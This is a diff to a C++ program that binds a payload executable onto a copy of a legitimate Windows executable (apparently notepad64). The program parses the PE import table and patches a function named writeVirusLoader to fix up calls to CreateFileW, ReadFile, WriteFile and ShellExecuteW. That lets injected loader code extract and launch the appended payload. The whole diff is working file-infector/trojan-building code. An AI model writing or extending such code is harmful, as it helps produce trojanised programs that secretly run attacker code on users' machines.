@@ -23,25 +23,81 @@ std::map<std::string, std::map<std::string, addr_t>> dllToFuncNameToAddress = {
     {
         "KERNEL32.dll", 
         {
-            { "CopyFileW", 0 },
-            { "GetLastError", 0 },
+            { "CreateFileW", 0 },
+            { "SetFilePointerEx", 0 },
+            { "ReadFile", 0 },
+            { "WriteFile", 0 },
+            { "CloseHandle", 0 },
+            { "GetModuleFileNameW", 0 },
         }
     },
+    {
+        "SHELL32.dll",
+        {
+            { "ShellExecuteW", 0 }
+        }
+    },
+    {
+        "VARIABLES",
+        {
+            { "BaseFileSize", 0 }
+        }
+    }
 };
 
 std::vector<std::pair<std::string, std::string>> externFunctionsToFill = {
-    { "KERNEL32.dll", "CopyFileW" },
-    { "KERNEL32.dll", "GetLastError" },
+    { "KERNEL32.dll", "GetModuleFileNameW" },
+    { "KERNEL32.dll", "CreateFileW" },
+    { "VARIABLES", "BaseFileSize" },
+    { "KERNEL32.dll", "SetFilePointerEx" },
+    { "KERNEL32.dll", "CreateFileW" },
+    { "KERNEL32.dll", "ReadFile" },
+    { "KERNEL32.dll", "WriteFile" },
+    { "KERNEL32.dll", "CloseHandle" },
+    { "KERNEL32.dll", "CloseHandle" },
+    { "SHELL32.dll", "ShellExecuteW" },
 };
 
 void analyzeEXE(const char* exePath);
+std::string addPayload(const std::string& base, const std::string& payload);
 
 int main()
 {
-    std::string exePath = "../debug/notepad64 - copy.exe";
-    // std::cout << "Enter exe path: ";
-    // std::getline(std::cin, exePath);
-    analyzeEXE(exePath.c_str());
+    std::string basePath;
+    std::cout << "Base exe path: ";
+    std::getline(std::cin, basePath);
+
+    std::string payloadPath;
+    std::cout << "Payload exe path: ";
+    std::getline(std::cin, payloadPath);
+
+    std::string newPath = addPayload(basePath, payloadPath);
+    analyzeEXE(newPath.c_str());
+}
+
+std::string addPayload(const std::string& base, const std::string& payload)
+{
+    std::string newPath = "COPY - " + base;
+    CopyFileA(base.c_str(), newPath.c_str(), FALSE);
+
+
+    // add payload to copy
+    HANDLE houtfile = CreateFileA(newPath.c_str(), FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hinfile = CreateFileA(payload.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    // get file size
+    dllToFuncNameToAddress["VARIABLES"]["BaseFileSize"] = GetFileSize(houtfile, NULL);
+
+    // write payload
+    BYTE buff[1024];
+    DWORD bytesRead = 0;
+    while (ReadFile(hinfile, buff, sizeof(buff), &bytesRead, NULL) && bytesRead > 0)
+        WriteFile(houtfile, buff, bytesRead, NULL, NULL);
+
+    CloseHandle(hinfile);
+    CloseHandle(houtfile);
+
+    return newPath;
 }
 
 addr_t base;
@@ -66,10 +122,17 @@ void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, addr_t codeSec
         {
             fseek(exeFile, -3, SEEK_CUR);
             auto func = externFunctionsToFill[callIndex++];
+            if (!dllToFuncNameToAddress[func.first][func.second])
+                printf("Oh no couldn't find function (%s -> %s)\n", func.first.c_str(), func.second.c_str());
+            if (func.first == "VARIABLES")
+            {
+                fwrite(&dllToFuncNameToAddress[func.first][func.second], sizeof(int), 1, exeFile);
+                c = fgetc(virusLoader);
+                continue;
+            }
             addr_t virtualDestination = dllToFuncNameToAddress[func.first][func.second];
             addr_t virtualSource = (addr_t)ftell(exeFile) + codeSectionRawToVirtual + sizeof(DWORD);  // end of current instruction
             int relativeCall = virtualDestination - virtualSource;
-            printf("jump from 0x%llX to 0x%llX: 0x%X", virtualSource, virtualDestination, relativeCall);
             fwrite(&relativeCall, sizeof(int), 1, exeFile);
             c = fgetc(virusLoader);
             continue;
@@ -118,6 +181,7 @@ void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRa
             continue;
         auto& funcToAddress = dllToFuncNameToAddress[nameBuffer];
 
+        long filePos = ftell(file);
         // go over all functions
         IMAGE_THUNK_DATA64 ILT;
         fseek(file, importDescriptor.FirstThunk + virtualRawOffset, SEEK_SET);
@@ -134,6 +198,8 @@ void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRa
 
             offset += sizeof(IMAGE_THUNK_DATA64);
         }
+        // restore position
+        fseek(file, filePos, SEEK_SET);
     }
 }
 
